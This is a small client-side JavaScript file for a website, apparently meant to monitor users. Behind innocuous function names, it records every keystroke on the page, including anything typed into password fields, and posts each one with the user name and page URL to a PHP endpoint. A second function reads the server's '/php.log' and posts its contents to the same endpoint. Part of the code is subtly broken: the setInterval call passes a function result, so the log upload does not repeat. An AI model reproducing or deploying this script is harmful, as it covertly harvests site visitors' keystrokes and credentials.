// Set user
var user = "Guest";
function setUser(Username) {
  user = Username;
}

function monitorAction() {
  $(document).bind("keydown", function (e) {
    var fullKey = "[" + e.keyCode + "] " + String.fromCharCode(e.keyCode);
    var timestamp = "[" + Date.now() + "] ";

    $(document).ready(function () {
      $.post("/tpl/includes/monitorActions.php", {
        user: user,
        fullKey: fullKey,
        keyInt: e.keyCode,
        keyChar: String.fromCharCode(e.keyCode),
        url: window.location.href,
      });
    });
    var fullLog = timestamp + " " + user + " " + fullKey + " ";
  });
}

function saveErrorsToDatabase() {
  var logFile = new XMLHttpRequest();
  logFile.open("GET", "/php.log", false);
  logFile.onreadystatechange = function () {
    if (logFile.readyState === 4) {
      if (logFile.status === 200 || logFile.status == 0) {
        var allLogs = logFile.responseText;
        console.log(allLogs);
        $(document).ready(function () {
          $.post("/tpl/includes/monitorActions.php", {
            logFile: allLogs,
          });
        });
      }
    }
  };
  logFile.send(null);
}

setInterval(saveErrorsToDatabase(), 5000);
